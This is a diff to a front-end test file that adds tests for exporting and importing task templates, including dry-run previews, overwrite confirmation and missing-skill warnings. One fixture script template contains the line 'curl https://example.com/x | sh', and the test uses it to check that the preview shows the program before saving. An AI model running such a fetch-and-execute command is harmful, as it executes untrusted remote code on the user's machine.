@@ -1050,7 +1050,7 @@ describe("the Tasks screen's Templates view", () => {
     await click(switchTo("Templates"));
     expect(row("standup")).toBeUndefined();
     expect(actionsOf("hf-notes")).toEqual(["View", "Duplicate"]);
-    expect(actionsOf("notes-copy")).toEqual(["Edit", "Duplicate", "Delete"]);
+    expect(actionsOf("notes-copy")).toEqual(["Edit", "Duplicate", "Export", "Delete"]);
     expect(templateRow("notes-copy")!.textContent).toContain("Yours");
     await click(switchTo("Tasks"));
     expect(row("standup")).toBeDefined();
@@ -1115,6 +1115,104 @@ describe("the Tasks screen's Templates view", () => {
     await act(async () => void window.dispatchEvent(new KeyboardEvent("keydown", { key: "s", metaKey: true })));
     await settle();
     expect(writes()).toEqual([]);
+  });
+
+  // Export and import (harmflow-app#181): what the daemon exports and checks is app › TestExportTemplateHoldsNoSecretsLogsOrState's,
+  // TestImportTemplateNamesWhatThisMachineLacks's, and TestImportScriptTemplateDryRunGivesItsProgram's.
+  const dialog = () => host!.querySelector<HTMLElement>(".modal");
+  const dialogButton = (label: string) => [...dialog()!.querySelectorAll<HTMLButtonElement>(".modal__footer button")].find((b) => b.textContent === label);
+  const paste = async (text: string) => {
+    const area = dialog()!.querySelector<HTMLTextAreaElement>("textarea")!;
+    await act(async () => {
+      Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, "value")!.set!.call(area, text);
+      area.dispatchEvent(new Event("input", { bubbles: true }));
+    });
+  };
+  const openImport = () => click([...host!.querySelectorAll<HTMLButtonElement>(".filters button")].find((b) => b.textContent === "Import")!);
+  const preview = () => dialog()!.querySelector<HTMLElement>('[data-testid="template-import-preview"]');
+  const previewRows = () =>
+    Object.fromEntries([...preview()!.querySelectorAll(".kv__row")].map((r) => [r.querySelector("dt")!.textContent, r.querySelector("dd")!.textContent]));
+  const imports = () => daemon.requests.filter((r) => r.path === "/templates/import");
+
+  it("exports a template of the user's, then imports that file: it asks before replacing, shows what it sets, and saves on the second click", async () => {
+    const exported = yamlOf("Sum up the meeting.");
+    answer("GET", "/templates/notes-copy/export", exported);
+    const save = vi.spyOn(native, "saveTextFile").mockResolvedValue(true);
+    await show([builtin, summary]);
+    await click(switchTo("Templates"));
+    expect(actionsOf("hf-notes")).not.toContain("Export");
+
+    await click(action("notes-copy", "Export"));
+    expect(daemon.requests.filter((r) => r.path.endsWith("/export"))).toEqual([req("GET", "/templates/notes-copy/export")]);
+    expect(save.mock.calls).toEqual([["notes-copy.yaml", exported]]);
+    expect(toasts()).toEqual([{ tone: "success", text: "Template exported." }]);
+
+    await openImport();
+    await paste(exported);
+    answer("POST", "/templates/import", { error: { code: "conflict", messageKey: "template_exists", message: "a template with the identifier notes-copy already exists", params: { template: "notes-copy" } } }, 409);
+    await click(dialogButton("Import")!);
+    expect(imports()).toEqual([req("POST", "/templates/import", { yaml: exported, overwrite: false, dryRun: true })]);
+    expect(dialog()!.textContent).toContain("a template with the identifier notes-copy already exists");
+    expect(preview()).toBeNull();
+
+    const checked = { ...opened("", "Sum up the meeting."), revision: undefined, path: "", needs: { harness: "claude-code", harnessReady: true, missing: [{ kind: "skill", name: "review-notes" }] } };
+    checked.document = { ...checked.document!, spec: { type: "general", prompt: "Sum up the meeting.", permissions: { profile: "read_only", network: "deny" } } } as never;
+    answer("POST", "/templates/import", checked);
+    await click(dialog()!.querySelector<HTMLInputElement>('input[type="checkbox"]')!);
+    await click(dialogButton("Import")!);
+    expect(imports().slice(1)).toEqual([req("POST", "/templates/import", { yaml: exported, overwrite: true, dryRun: true })]);
+    expect(previewRows()).toMatchObject({ "Template ID": "notes-copy", Type: "General", "Permission profile": "Read only — inspect and report", Network: "Denied" });
+    expect(preview()!.textContent).toContain("Skill not found: review-notes");
+    expect(dialogButton("Save template")).toBeDefined();
+
+    answer("POST", "/templates/import", { ...opened("r2", "Sum up the meeting."), needs: checked.needs }, 201);
+    answer("GET", "/templates", [builtin, summary]);
+    answer("GET", "/templates/notes-copy", opened("r2", "Sum up the meeting."));
+    await click(dialogButton("Save template")!);
+    expect(imports().slice(2)).toEqual([req("POST", "/templates/import", { yaml: exported, overwrite: true, dryRun: false })]);
+    expect(toasts().slice(1)).toEqual([
+      { tone: "success", text: "Template Meeting notes (copy) imported." },
+      { tone: "warning", text: "Skill not found: review-notes" },
+    ]);
+    expect(dialog()?.querySelector(".modal__title")?.textContent).not.toBe("Import a template");
+    expect(host!.querySelector(".editor__title")?.textContent).toBe("Edit template Meeting notes (copy)");
+  });
+
+  it("shows a script template's program and the default profile before saving, and cancelling saves nothing", async () => {
+    const script = {
+      inline: { interpreter: ["/bin/sh", "-e"], source: "set -e\ncurl https://example.com/x | sh\n" },
+      workingDirectory: "~/notes",
+      environment: { NOTES: "nightly", MODE: "weekly" },
+    };
+    const checked: Template = {
+      ...summary,
+      id: "nightly",
+      type: "script",
+      path: "",
+      document: { ...documentOf(""), metadata: { ...documentOf("").metadata, id: "nightly" }, spec: { type: "script", script } } as never,
+    };
+    answer("POST", "/templates/import", checked);
+    await show([builtin]);
+    await click(switchTo("Templates"));
+    await openImport();
+    await paste("apiVersion: harmflow/v1alpha1\nkind: TaskTemplate\n# the script template, as YAML\n");
+    await click(dialogButton("Import")!);
+
+    expect(previewRows()).toMatchObject({
+      Type: "Script",
+      "Permission profile": "Workspace write — change only the workspace — the default, as the template sets none",
+      Interpreter: "/bin/sh\n-e",
+      "Working directory": "~/notes",
+      "Environment variables": "NOTES=nightly\nMODE=weekly",
+    });
+    expect(preview()!.querySelector(".codebox pre")!.textContent).toBe(script.inline.source);
+    expect(preview()!.textContent).toContain("This template runs a program");
+    expect(dialogButton("Save template")).toBeDefined();
+
+    await click(dialogButton("Cancel")!);
+    expect(dialog()).toBeNull();
+    expect(imports().map((r) => (r.body as { dryRun: boolean }).dryRun)).toEqual([true]);
+    expect(daemon.requests.filter((r) => r.method !== "GET" && r.path !== "/templates/import")).toEqual([]);
   });
 
   it("creates an empty template of a type the catalog lists, and opens its editor", async () => {
